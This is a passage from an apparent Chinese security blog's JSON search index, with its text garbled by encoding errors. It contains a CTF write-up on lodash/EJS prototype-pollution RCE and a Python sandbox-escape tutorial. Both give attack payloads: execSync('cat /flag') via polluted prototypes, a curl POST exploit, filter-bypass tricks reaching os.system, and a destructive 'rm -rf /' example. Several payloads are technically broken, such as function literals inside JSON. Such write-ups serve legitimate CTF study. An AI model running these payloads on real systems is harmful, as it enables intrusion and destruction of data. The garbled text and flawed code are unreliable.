\u0026#34;__proto__\u0026#34;: { \u0026#34;polluted\u0026#34;: \u0026#34;test\u0026#34; } } éªŒè¯æ±¡æŸ“\nï¼šåœ¨åç»­è¯·æ±‚ä¸­ï¼Œæ£€æŸ¥ä»»æ„å¯¹è±¡çš„\n1 polluted å±æ€§ï¼š\n1 2 3 javascript // æœåŠ¡ç«¯ä»£ç ç¤ºä¾‹ console.log({}.polluted); // è‹¥è¾“å‡º \u0026#34;test\u0026#34;ï¼Œåˆ™æ±¡æŸ“æˆåŠŸ æ­¥éª¤2ï¼šåˆ©ç”¨æ±¡æŸ“å®ç°RCE\rç›®æ ‡æ˜¯é€šè¿‡æ±¡æŸ“åŸå‹é“¾ï¼Œåœ¨æ¨¡æ¿æ¸²æŸ“æ—¶è§¦å‘ä»£ç æ‰§è¡Œã€‚ EJSæ¨¡æ¿ç‰¹æ€§ï¼šEJS åœ¨æ¸²æŸ“æ—¶ï¼Œè‹¥æ¨¡æ¿ä¸­è®¿é—®äº†å¯¹è±¡å±æ€§ï¼Œä¸”è¯¥å±æ€§è¢«æ±¡æŸ“ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œåˆ™ä¼šæ‰§è¡Œè¯¥å‡½æ•°ã€‚\næ„é€ æ¶æ„Payloadï¼š è¦†ç›– Object.prototype çš„æŸä¸ªæ–¹æ³•ï¼ˆå¦‚ toStringï¼‰ï¼Œæ’å…¥æ¶æ„ä»£ç ï¼š\n1 2 3 4 5 6 json { \u0026#34;__proto__\u0026#34;: { \u0026#34;toString\u0026#34;: \u0026#34;() =\u0026gt; { return global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;cat /flag\u0026#39;).toString() }\u0026#34; } } æˆ–æ›´éšè”½çš„æ–¹å¼ï¼š\n1 2 3 4 5 6 7 8 9 10 json { \u0026#34;constructor\u0026#34;: { \u0026#34;prototype\u0026#34;: { \u0026#34;toString\u0026#34;: function() { return this.flag ||= require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;cat /flag\u0026#39;).toString(); } } } } æ­¥éª¤3ï¼šè§¦å‘æ¨¡æ¿æ¸²æŸ“æ‰§è¡Œä»£ç \rå‡è®¾æ¨¡æ¿ index.ejs ä¸­æœ‰å¦‚ä¸‹ä»£ç ï¼š\n1 2 plaintext \u0026lt;%= language %\u0026gt; // æˆ–å…¶ä»–è¾“å‡ºç‚¹ å½“ language æœªå®šä¹‰æ—¶ï¼ŒEJS ä¼šå°è¯•ä»åŸå‹é“¾æŸ¥æ‰¾ language å±æ€§ã€‚è‹¥ Object.prototype.language è¢«æ±¡æŸ“ä¸ºæ¶æ„å‡½æ•°ï¼Œåˆ™ä¼šæ‰§è¡Œè¯¥å‡½æ•°ã€‚\næœ€ç»ˆPayloadï¼š\n1 2 3 4 5 6 7 8 json { \u0026#34;__proto__\u0026#34;: { \u0026#34;language\u0026#34;: function() { return global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;cat /flag\u0026#39;).toString(); } } } æ­¥éª¤4ï¼šå‘é€è¯·æ±‚å¹¶è·å–flag\rå‘é€POSTè¯·æ±‚\nï¼š\n1 2 3 4 bash curl -X POST http://target.com/ \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;__proto__\u0026#34;: {\u0026#34;language\u0026#34;: function(){ return require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;cat /flag\u0026#34;).toString() }}}\u0026#39; è§¦å‘æ¨¡æ¿æ¸²æŸ“ï¼š è®¿é—®é¦–é¡µ GET /ï¼Œæ¨¡æ¿ä¼šå°è¯•æ¸²æŸ“ language å±æ€§ï¼Œæ‰§è¡Œæ±¡æŸ“åçš„å‡½æ•°ï¼Œè¿”å›flagã€‚\n3. æŠ€æœ¯åŸç†\råŸå‹é“¾æ±¡æŸ“ï¼šé€šè¿‡ lodash.merge å°† __proto__ æ³¨å…¥åˆ° data å¯¹è±¡ï¼Œæ±¡æŸ“ Object.prototypeã€‚ æ¨¡æ¿å¼•æ“è§¦å‘ï¼šEJS æ¸²æŸ“æ—¶è®¿é—®è¢«æ±¡æŸ“å±æ€§ï¼ˆå¦‚ languageï¼‰ï¼Œè°ƒç”¨å·²è¦†ç›–çš„å‡½æ•°ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ RCEé“¾ï¼š æ±¡æŸ“å‡½æ•° â†’ æ¨¡æ¿è°ƒç”¨å‡½æ•° â†’ æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ â†’ è¿”å›flagã€‚ ğŸ¤”\nå…³é”®ç‚¹\nï¼š\nè¯†åˆ« lodash.merge åˆå¹¶ç”¨æˆ·è¾“å…¥ã€‚ æ„é€  __proto__ æˆ– constructor.prototype æ±¡æŸ“åŸå‹é“¾ã€‚ åˆ©ç”¨æ¨¡æ¿å¼•æ“æ¸²æŸ“è§¦å‘æ¶æ„ä»£ç ã€‚ æœ€ç»ˆæ•ˆæœï¼šé€šè¿‡æ±¡æŸ“ Object.prototype.languageï¼Œåœ¨æ¸²æŸ“æ—¶æ‰§è¡Œ cat /flagï¼Œç›´æ¥è·å–flagã€‚\nå‚è€ƒï¼š\næ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡»\n","date":"2025-06-01T10:29:47+08:00","permalink":"https://Oight.github.io/p/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","title":"åŸå‹é“¾æ±¡æŸ“"},{"content":"Pythonæ²™ç®±é€ƒé€¸\ræˆ‘ä»¬çŸ¥é“Pythonå¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ä»¥åŠå…¶ä»–æ¼æ´è¿›è¡Œæ”»å‡»ï¼Œå› æ­¤ï¼Œåœ¨CTFä¸­ä¹Ÿä¼šé€šè¿‡é˜²ç«å¢™æ¥è¿›è¡Œé˜²å¾¡ã€‚ä»Šå¤©æˆ‘ä»¬å°±è®¨è®ºä¸€ä¸‹å¦‚ä½•ç»•è¿‡é˜²ç«å¢™æ¥å®ç°æ”»å‡»è¡Œä¸ºï¼Œå³Pythonçš„æ²™ç®±é€ƒé€¸\nä»€ä¹ˆæ˜¯Pythonæ²™ç®±\rPython æ²™ç®±ï¼ˆSandboxï¼‰ æ˜¯ä¸€ä¸ªéš”ç¦»çš„ä»£ç æ‰§è¡Œç¯å¢ƒï¼Œç”¨äºå®‰å…¨åœ°è¿è¡Œä¸å—ä¿¡ä»»çš„ä»£ç ï¼Œé˜²æ­¢å…¶å¯¹å®¿ä¸»ç³»ç»Ÿé€ æˆç ´åã€‚åœ¨Pythonä¸­ï¼Œæ²™ç®±é€šè¿‡é™åˆ¶ä»£ç çš„è®¿é—®æƒé™ï¼ˆå¦‚æ–‡ä»¶è¯»å†™ã€ç½‘ç»œè¯·æ±‚ã€ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œç­‰ï¼‰ï¼Œç¡®ä¿ç¨‹åºåªèƒ½åœ¨å¯æ§èŒƒå›´å†…æ“ä½œã€‚\næ¯”å¦‚åœ¨Pythonååºåˆ—åŒ–ä¸­ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡ååºåˆ—åŒ–æ¥è®©ç¨‹åºæ‰§è¡Œæˆ‘ä»¬æƒ³è®©å®ƒæ‰§è¡Œçš„ä»£ç æ¥å®ç°ç›¸åº”çš„åŠŸèƒ½ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å°±å€ŸåŠ©äº†Pythonä¸­çš„ä¸€äº›å‡½æ•°å’Œæ¨¡å—æ¥å®ç°è¿™äº›åŠŸèƒ½ã€‚\nåŒæ ·çš„ï¼Œä¸ºäº†é¿å…å®‰å…¨é£é™©ï¼Œç¨‹åºçš„è®¾è®¡è€…ä¼šæƒ³åŠæ³•ç¦æ­¢æˆ‘ä»¬åˆ©ç”¨è¿™äº›å±é™©çš„å‡½æ•°å’Œæ¨¡å—ã€‚\nç¤ºä¾‹ï¼šï¼ˆä¸€ä¸ªç®€å•çš„Pythonæ²™ç®±ï¼‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 python # åˆ›å»ºä¸€ä¸ªç¦ç”¨å±é™©å‡½æ•°çš„ç¯å¢ƒ def safe_exec(code): allowed_builtins = {\u0026#34;abs\u0026#34;, \u0026#34;max\u0026#34;, \u0026#34;min\u0026#34;, \u0026#34;print\u0026#34;} # ç™½åå• restricted_globals = { \u0026#34;__builtins__\u0026#34;: {func: __builtins__[func] for func in allowed_builtins} } try: exec(code, restricted_globals) except Exception as e: print(\u0026#34;Blocked:\u0026#34;, e) # æµ‹è¯•å®‰å…¨æ‰§è¡Œ safe_exec(\u0026#34;print(\u0026#39;Hello World\u0026#39;)\u0026#34;) # æ­£å¸¸ safe_exec(\u0026#34;open(\u0026#39;test.txt\u0026#39;, \u0026#39;w\u0026#39;)\u0026#34;) # æŠ¥é”™ï¼šopen ä¸å¯ç”¨ Pythonæ²™ç®±çš„å®ç°åŸç†å’Œå¸¸è§æ–¹æ³•\rPythonæ²™ç®±çš„æ ¸å¿ƒæ˜¯é™åˆ¶ä»£ç çš„æ‰§è¡Œæƒé™\nå¸¸ç”¨æ–¹æ³•ï¼š æ¨¡å—å’Œå‡½æ•°ç™½åå•/é»‘åå•\nç§»é™¤å±é™©æ¨¡å—ï¼šç¦ç”¨å¦‚ osã€sysã€subprocess ç­‰æ¨¡å—ã€‚\nè¦†ç›–å†…ç½®å‡½æ•°ï¼šæ›¿æ¢ __import__ã€openã€eval ç­‰å‡½æ•°ã€‚\nç¤ºä¾‹ï¼š\n1 2 3 4 python # ç¦ç”¨ os æ¨¡å— import sys sys.modules[\u0026#39;os\u0026#39;] = None # é˜»æ­¢å¯¼å…¥os ä»€ä¹ˆæ˜¯Pythonæ²™ç®±é€ƒé€¸\rPython æ²™ç®±é€ƒé€¸ï¼ˆSandbox Escapeï¼‰æ˜¯æŒ‡åœ¨ä¸€ä¸ªå—é™åˆ¶çš„Pythonæ‰§è¡Œç¯å¢ƒï¼ˆæ²™ç®±ï¼‰ä¸­ï¼Œé€šè¿‡æŠ€æœ¯æ‰‹æ®µç»•è¿‡å®‰å…¨é™åˆ¶ï¼Œè®¿é—®æˆ–æ§åˆ¶æœ¬åº”è¢«ç¦æ­¢çš„èµ„æºï¼ˆå¦‚æ–‡ä»¶ç³»ç»Ÿã€æ“ä½œç³»ç»Ÿå‘½ä»¤ã€ç½‘ç»œç­‰ï¼‰ã€‚æ²™ç®±é€šå¸¸ç”¨äºéš”ç¦»ä¸å¯ä¿¡ä»£ç ï¼Œä½†åœ¨è®¾è®¡ä¸å½“æ—¶å¯èƒ½è¢«æ”»å‡»è€…çªç ´ã€‚\nå¸¸ç”¨çš„ Python å†…å»ºå‡½æ•°\råœ¨ Python çš„å†…å»ºå‡½æ•°ä¸­ï¼Œæœ‰ä¸€äº›å‡½æ•°å¯ä»¥å¸®åŠ©æˆ‘ä»¬å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œï¼š\n1 2 3 4 5 6 7 8 os.system() os.popen() commands.getstatusoutput() commands.getoutput() commands.getstatus() subprocess.call(command, shell=True) subprocess.Popen(command, shell=True) pty.spawn() å¯ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„æ¨¡å—æœ‰\n1 2 3 4 5 os pty subprocess plarform commands æœ‰äº›æ—¶å€™ï¼Œæ¯”å¦‚CTFï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦å»æ‰§è¡Œå‘½ä»¤ï¼Œè€Œæ˜¯å»è¯»å–ç›®å½•ä¸‹çš„flagæ–‡ä»¶å³å¯ï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦æ–‡ä»¶è¯»å–çš„æ¨¡å—æ¥æ‰§è¡Œï¼Œå¸¸ç”¨çš„æ–‡ä»¶è¯»å–æ¨¡å—ï¼š\n1 2 3 4 file open codecs fileinput ä¸è¿‡å…¶ä¸­fileåªåœ¨python2ä¸­æ‰§è¡Œ\nå¸¸è§çš„Pythonæ²™ç®±é€ƒé€¸æ–¹æ³•\ræˆ‘ä»¬ä¸Šé¢æåˆ°ï¼Œåœ¨æ²™ç®±ä¸­ï¼Œæˆ‘ä»¬å¾€å¾€æ— æ³•ç›´æ¥åˆ©ç”¨ä¸Šé¢çš„å±é™©å‡½æ•°å’Œæ¨¡å—ï¼Œå› æ­¤æˆ‘ä»¬å°±éœ€è¦å¯¼å…¥ç›¸å…³æ¨¡å—å¹¶ä½¿ç”¨ä¸Šè¿°çš„å‡½æ•°å®ç°å‘½ä»¤æ‰§è¡Œã€‚\näºæ˜¯ï¼ŒPythonæ²™ç®±é€ƒé€¸çš„é‡ç‚¹å°±è½åœ¨äº†å¦‚ä½•ç»•è¿‡é˜²å¾¡æªæ–½æ¥å¯¼å…¥æˆ‘ä»¬éœ€è¦çš„æ¨¡å—å¹¶ä½¿ç”¨ä¸Šè¿°å‡½æ•°ã€‚\n1.è¦†ç›–æˆ–æ›¿æ¢å‡½æ•°/æ¨¡å—\rPythonå…è®¸è¦†ç›–å†…ç½®å‡½æ•°ï¼ˆå¦‚__import__ã€openã€eval ç­‰ï¼‰æˆ–æ¨¡å—ï¼ˆå¦‚ osã€sysï¼‰ã€‚ ç¤ºä¾‹ï¼š\n1 2 3 python # è¦†ç›– __import__ å‡½æ•°ä»¥ç»•è¿‡é™åˆ¶ __import__ = lambda x: os.system(\u0026#34;rm -rf /\u0026#34;) # æ¶æ„æ“ä½œ 2.ç»•è¿‡å¯¼å…¥é™åˆ¶\rè¿‡æ»¤åº“\rPythonå¯¼å…¥åº“çš„å½¢å¼å¾ˆçµæ´»ï¼Œæ¯”å¦‚ï¼š\n1 2 3 4 5 è¿‡æ»¤äº†import os import os import os import os ... å¦‚æœå¤šä¸ªç©ºæ ¼ä¹Ÿè¿‡æ»¤äº†ï¼ŒPython èƒ½å¤Ÿ import çš„å¯ä¸æ­¢ importï¼Œè¿˜æœ‰ __import__ï¼š__import__('os')ï¼Œ__import__è¢«å¹²äº†è¿˜æœ‰ importlibï¼šimportlib.import_module('os').system('ls')\nå¦‚æœè¿‡æ»¤äº†æ¨¡å—åï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨è·¯å¾„å¼•å…¥çš„æ–¹å¼æ¥å¯¼å…¥æ¨¡å—ï¼š\n1 2 3 4 \u0026gt;\u0026gt;\u0026gt; import sys \u0026gt;\u0026gt;\u0026gt; sys.modules[\u0026#39;os\u0026#39;]=\u0026#39;/usr/lib/python2.7/os.py\u0026#39; \u0026gt;\u0026gt;\u0026gt; import os \u0026gt;\u0026gt;\u0026gt; å¦‚æœ import ä¹Ÿè¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥ä½¿ç”¨è·¯å¾„å¼•å…¥çš„æ–¹å¼æ¥å¯¼å…¥æ¨¡å—\n1 2 3 4 plaintext execfile(\u0026#39;/usr/lib/python2.7/os.py\u0026#39;) system(\u0026#39;ls\u0026#39;) // åªèƒ½åœ¨Python2ä¸­ä½¿ç”¨execfile æˆ–æ˜¯\n1 2 3 4 python with open(\u0026#39;/usr/lib/python3.6/os.py\u0026#39;,\u0026#39;r\u0026#39;) as f: exec(f.read()) system(\u0026#39;ls\u0026#39;) è¿™ç§æ–¹å¼ Python2 å’Œ Python3 éƒ½å¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯ä½¿ç”¨è¿™ç§æ–¹å¼éƒ½éœ€è¦å·²çŸ¥åº“çš„è·¯å¾„ï¼Œåœ¨å¤§å¤šæ•°çš„ç¯å¢ƒä¸‹ï¼Œåº“éƒ½æ˜¯é»˜è®¤è·¯å¾„ã€‚\nå­—ç¬¦ä¸²å¤„ç†ç»•è¿‡è¿‡æ»¤\rä»£ç ä¸­è¦æ˜¯å‡ºç° osï¼Œç›´æ¥ä¸è®©è¿è¡Œã€‚é‚£ä¹ˆå¯ä»¥åˆ©ç”¨å­—ç¬¦ä¸²çš„å„ç§å˜åŒ–æ¥å¼•å…¥ osï¼š\n1 __import__(\u0026#39;so\u0026#39;[::-1]).system(\u0026#39;ls\u0026#39;) 1 2 3 b = \u0026#39;o\u0026#39; a = \u0026#39;s\u0026#39; __import__(a+b).system(\u0026#39;ls\u0026#39;) è¿˜å¯ä»¥åˆ©ç”¨ eval æˆ–è€… execï¼š\n1 2 3 4 5 \u0026gt;\u0026gt;\u0026gt; eval(\u0026#39;)\u0026#34;imaohw\u0026#34;(metsys.)\u0026#34;so\u0026#34;(__tropmi__\u0026#39;[::-1]) macr0phag3 0 \u0026gt;\u0026gt;\u0026gt; exec(\u0026#39;)\u0026#34;imaohw\u0026#34;(metsys.so ;so tropmi\u0026#39;[::-1]) macr0phag3 é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œevalã€exec éƒ½æ˜¯ç›¸å½“å±é™©çš„å‡½æ•°ï¼Œexec æ¯” eval è¿˜è¦å±é™©ï¼Œå®ƒä»¬ä¸€å®šè¦è¿‡æ»¤ï¼Œå› ä¸ºå­—ç¬¦ä¸²æœ‰å¾ˆå¤šå˜å½¢çš„æ–¹å¼ï¼Œå¯¹å­—ç¬¦ä¸²çš„å¤„ç†å¯ä»¥æœ‰ï¼šé€†åºã€å˜é‡æ‹¼æ¥ã€base64ã€hexã€rot13â€¦ç­‰ç­‰ï¼Œå¤ªå¤šäº†\nè¿‡æ»¤system\ræˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå¦‚æœä½¿ç”¨ os æ¨¡å—æ¥è¿›è¡Œæ”»å‡»ï¼Œéƒ½ä¼šä½¿ç”¨åˆ° system å‡½æ•°ï¼Œå¦‚æœè¿‡æ»¤äº† system å‡½æ•°ï¼Œæ˜¯å¦æˆ‘ä»¬å°±æ— èƒ½ä¸ºåŠ›äº†ï¼Ÿå®åˆ™ä¸ç„¶ï¼Œ os ä¸­èƒ½æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰å¾ˆå¤šï¼š\n1 2 3 4 5 6 print(os.system(\u0026#39;whoami\u0026#39;)) print(os.popen(\u0026#39;whoami\u0026#39;).read()) print(os.popen2(\u0026#39;whoami\u0026#39;).read()) # 2.x print(os.popen3(\u0026#39;whoami\u0026#39;).read()) # 2.x print(os.popen4(\u0026#39;whoami\u0026#39;).read()) # 2.x ... å¯¹äºè¿‡æ»¤å‡½æ•°çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ getattr æ‹¿åˆ°å¯¹è±¡çš„æ–¹æ³•ã€å±æ€§ï¼š\n1 2 import os getattr(os, \u0026#39;metsys\u0026#39;[::-1])(\u0026#39;whoami\u0026#39;) ä¸è®©å‡ºç° importä¹Ÿæ²¡äº‹ï¼š\n1 2 3 \u0026gt;\u0026gt;\u0026gt; getattr(getattr(__builtins__, \u0026#39;__tropmi__\u0026#39;[::-1])(\u0026#39;so\u0026#39;[::-1]), \u0026#39;metsys\u0026#39;[::-1])(\u0026#39;whoami\u0026#39;) macr0phag3 0 è¿™ä¸ªæ–¹æ³•åŒæ ·å¯ä»¥ç”¨äºé€ƒé€¸è¿‡æ»¤ import çš„æ²™ç®±ã€‚ä¸ getattr ç›¸ä¼¼çš„è¿˜æœ‰ __getattr__ã€__getattribute__ï¼Œå®ƒä»¬è‡ªå·±çš„åŒºåˆ«å°±æ˜¯ getattr ç›¸å½“äº class.attrï¼Œéƒ½æ˜¯è·å–ç±»å±æ€§/æ–¹æ³•çš„ä¸€ç§æ–¹å¼ï¼Œåœ¨è·å–çš„æ—¶å€™ä¼šè§¦å‘__getattribute__ï¼Œå¦‚æœ__getattribute__æ‰¾ä¸åˆ°ï¼Œåˆ™è§¦å‘__getattr__ï¼Œè¿˜æ‰¾ä¸åˆ°åˆ™æŠ¥é”™ã€‚\nbuiltinsã€builtinä¸builtins\rå…ˆè¯´ä¸€ä¸‹ï¼Œbuiltinã€builtinsï¼Œ__builtin__ä¸__builtins__çš„åŒºåˆ«ï¼šé¦–å…ˆæˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ Python ä¸­ï¼Œæœ‰å¾ˆå¤šå‡½æ•°ä¸éœ€è¦ä»»ä½• import å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¾‹å¦‚chrã€openã€‚ä¹‹æ‰€ä»¥å¯ä»¥è¿™æ ·ï¼Œæ˜¯å› ä¸º Python æœ‰ä¸ªå«å†…å»ºæ¨¡å—ï¼ˆæˆ–è€…å«å†…å»ºå‘½åç©ºé—´ï¼‰çš„ä¸œè¥¿ï¼Œå®ƒæœ‰ä¸€äº›å¸¸ç”¨å‡½æ•°ï¼Œå˜é‡å’Œç±»ã€‚\nåœ¨ 2.x ç‰ˆæœ¬ä¸­ï¼Œå†…å»ºæ¨¡å—è¢«å‘½åä¸º__builtin__ï¼Œåˆ°äº† 3.x å°±æˆäº† builtinsã€‚å®ƒä»¬éƒ½éœ€è¦ import æ‰èƒ½æŸ¥çœ‹,__builtins__ä¸¤è€…éƒ½æœ‰ï¼Œå®é™…ä¸Šæ˜¯__builtin__å’Œbuiltins çš„å¼•ç”¨ã€‚å®ƒä¸éœ€è¦å¯¼å…¥\n1 2 3 4 5 6 7 8 9 \u0026gt;\u0026gt;\u0026gt; \u0026#39;__import__\u0026#39; in dir(__builtins__) True \u0026gt;\u0026gt;\u0026gt; __builtins__.__dict__[\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;).system(\u0026#39;whoami\u0026#39;) macr0phag3 0 \u0026gt;\u0026gt;\u0026gt; \u0026#39;eval\u0026#39; in dir(__builtins__) True \u0026gt;\u0026gt;\u0026gt; \u0026#39;execfile\u0026#39; in dir(__builtins__) True æˆ‘ä»¬çœ‹åˆ°é‡Œé¢æœ‰å¾ˆå¤šæˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„å±é™©å‡½æ•°\né€šè¿‡ç»§æ‰¿å…³ç³»ç»•é€ƒé€¸\rPython ä¸­æ–°å¼ç±»éƒ½æœ‰ä¸ªå±æ€§ï¼Œå«__mro__ï¼Œæ˜¯ä¸ªå…ƒç»„ï¼Œè®°å½•äº†ç»§æ‰¿å…³ç³»ï¼š\n1 2 \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026#39;.__class__.__mro__ (\u0026lt;class \u0026#39;str\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;object\u0026#39;\u0026gt;) ç±»çš„å®ä¾‹åœ¨è·å– class å±æ€§æ—¶ä¼šæŒ‡å‘è¯¥å®ä¾‹å¯¹åº”çš„ç±»ã€‚å¯ä»¥çœ‹åˆ°ï¼Œâ€™â€™å±äº strç±»ï¼Œå®ƒç»§æ‰¿äº† object ç±»ï¼Œè¿™ä¸ªç±»æ˜¯æ‰€æœ‰ç±»çš„è¶…ç±»ã€‚å…·æœ‰ç›¸åŒåŠŸèƒ½çš„è¿˜æœ‰__base__å’Œ__bases__ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç»å…¸ç±»éœ€è¦æŒ‡æ˜ç»§æ‰¿ object æ‰ä¼šç»§æ‰¿å®ƒï¼Œå¦åˆ™æ˜¯ä¸ä¼šç»§æ‰¿çš„ï¼š\n1 2 3 4 5 6 7 8 9 \u0026gt;\u0026gt;\u0026gt; class test: ... pass ... \u0026gt;\u0026gt;\u0026gt; test.__bases__ \u0026gt;\u0026gt;\u0026gt; class test(object): ... pass ... \u0026gt;\u0026gt;\u0026gt; test.__bases__ (\u0026lt;type \u0026#39;object\u0026#39;\u0026gt;,) é‚£ä¹ˆçŸ¥é“è¿™ä¸ªæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ\nç”±äºæ²¡æ³•ç›´æ¥å¼•å…¥ osï¼Œé‚£ä¹ˆå‡å¦‚æœ‰ä¸ªåº“å«oosï¼Œåœ¨oosä¸­å¼•å…¥äº†osï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡__globals__æ‹¿åˆ° osï¼ˆ__globals__æ˜¯å‡½æ•°æ‰€åœ¨çš„å…¨å±€å‘½åç©ºé—´ä¸­æ‰€å®šä¹‰çš„å…¨å±€å˜é‡ï¼‰ã€‚ä¾‹å¦‚ï¼Œsite è¿™ä¸ªåº“å°±æœ‰ osï¼š\n1 2 3 \u0026gt;\u0026gt;\u0026gt; import site \u0026gt;\u0026gt;\u0026gt; site.os \u0026lt;module \u0026#39;os\u0026#39; from \u0026#39;/Users/macr0phag3/.pyenv/versions/3.6.5/lib/python3.6/os.py\u0026#39;\u0026gt; ä¹Ÿå°±æ˜¯è¯´ï¼Œèƒ½å¼•å…¥ site çš„è¯ï¼Œå°±ç›¸å½“äºæœ‰ osã€‚é‚£å¦‚æœ site ä¹Ÿè¢«ç¦ç”¨äº†å‘¢ï¼Ÿæ²¡äº‹ï¼Œæœ¬æ¥ä¹Ÿå°±æ²¡æ‰“ç®—ç›´æ¥ import siteã€‚å¯ä»¥åˆ©ç”¨ reloadï¼Œå˜ç›¸åŠ è½½ osï¼š\n1 2 3 4 5 6 7 8 9 \u0026gt;\u0026gt;\u0026gt; import site \u0026gt;\u0026gt;\u0026gt; os Traceback (most recent call last): File \u0026#34;\u0026lt;stdin\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; NameError: name \u0026#39;os\u0026#39; is not defined \u0026gt;\u0026gt;\u0026gt; os = reload(site.os) \u0026gt;\u0026gt;\u0026gt; os.system(\u0026#39;whoami\u0026#39;) macr0phag3 0 è¿˜æœ‰ï¼Œæ—¢ç„¶æ‰€æœ‰çš„ç±»éƒ½ç»§æ‰¿çš„objectï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆç”¨__subclasses__çœ‹çœ‹å®ƒçš„å­ç±»ï¼Œä»¥ 2.x ä¸ºä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 python 2\u0026gt;\u0026gt;\u0026gt; for i in enumerate(\u0026#39;\u0026#39;.__class__.__mro__[-1].__subclasses__()): print i ... (0, \u0026lt;type \u0026#39;type\u0026#39;\u0026gt;) (1, \u0026lt;type \u0026#39;weakref\u0026#39;\u0026gt;) (2, \u0026lt;type \u0026#39;weakcallableproxy\u0026#39;\u0026gt;) (3, \u0026lt;type \u0026#39;weakproxy\u0026#39;\u0026gt;) (4, \u0026lt;type \u0026#39;int\u0026#39;\u0026gt;) (5, \u0026lt;type \u0026#39;basestring\u0026#39;\u0026gt;) (6, \u0026lt;type \u0026#39;bytearray\u0026#39;\u0026gt;) (7, \u0026lt;type \u0026#39;list\u0026#39;\u0026gt;) (8, \u0026lt;type \u0026#39;NoneType\u0026#39;\u0026gt;) (9, \u0026lt;type \u0026#39;NotImplementedType\u0026#39;\u0026gt;) (10, \u0026lt;type \u0026#39;traceback\u0026#39;\u0026gt;) (11, \u0026lt;type \u0026#39;super\u0026#39;\u0026gt;) (12, \u0026lt;type \u0026#39;xrange\u0026#39;\u0026gt;) (13, \u0026lt;type \u0026#39;dict\u0026#39;\u0026gt;) (14, \u0026lt;type \u0026#39;set\u0026#39;\u0026gt;) (15, \u0026lt;type \u0026#39;slice\u0026#39;\u0026gt;) (16, \u0026lt;type \u0026#39;staticmethod\u0026#39;\u0026gt;) (17, \u0026lt;type \u0026#39;complex\u0026#39;\u0026gt;) (18, \u0026lt;type \u0026#39;float\u0026#39;\u0026gt;) (19, \u0026lt;type \u0026#39;buffer\u0026#39;\u0026gt;) (20, \u0026lt;type \u0026#39;long\u0026#39;\u0026gt;) (21, \u0026lt;type \u0026#39;frozenset\u0026#39;\u0026gt;) (22, \u0026lt;type \u0026#39;property\u0026#39;\u0026gt;) (23, \u0026lt;type \u0026#39;memoryview\u0026#39;\u0026gt;) (24, \u0026lt;type \u0026#39;tuple\u0026#39;\u0026gt;) (25, \u0026lt;type \u0026#39;enumerate\u0026#39;\u0026gt;) (26, \u0026lt;type \u0026#39;reversed\u0026#39;\u0026gt;) (27, \u0026lt;type \u0026#39;code\u0026#39;\u0026gt;) (28, \u0026lt;type \u0026#39;frame\u0026#39;\u0026gt;) (29, \u0026lt;type \u0026#39;builtin_function_or_method\u0026#39;\u0026gt;) (30, \u0026lt;type \u0026#39;instancemethod\u0026#39;\u0026gt;) (31, \u0026lt;type \u0026#39;function\u0026#39;\u0026gt;) (32, \u0026lt;type \u0026#39;classobj\u0026#39;\u0026gt;) (33, \u0026lt;type \u0026#39;dictproxy\u0026#39;\u0026gt;) (34, \u0026lt;type \u0026#39;generator\u0026#39;\u0026gt;) (35, \u0026lt;type \u0026#39;getset_descriptor\u0026#39;\u0026gt;) (36, \u0026lt;type \u0026#39;wrapper_descriptor\u0026#39;\u0026gt;) (37, \u0026lt;type \u0026#39;instance\u0026#39;\u0026gt;) (38, \u0026lt;type \u0026#39;ellipsis\u0026#39;\u0026gt;) (39, \u0026lt;type \u0026#39;member_descriptor\u0026#39;\u0026gt;) (40, \u0026lt;type \u0026#39;file\u0026#39;\u0026gt;) (41, \u0026lt;type \u0026#39;PyCapsule\u0026#39;\u0026gt;) (42, \u0026lt;type \u0026#39;cell\u0026#39;\u0026gt;) (43, \u0026lt;type \u0026#39;callable-iterator\u0026#39;\u0026gt;) (44, \u0026lt;type \u0026#39;iterator\u0026#39;\u0026gt;) (45, \u0026lt;type \u0026#39;sys.long_info\u0026#39;\u0026gt;) (46, \u0026lt;type 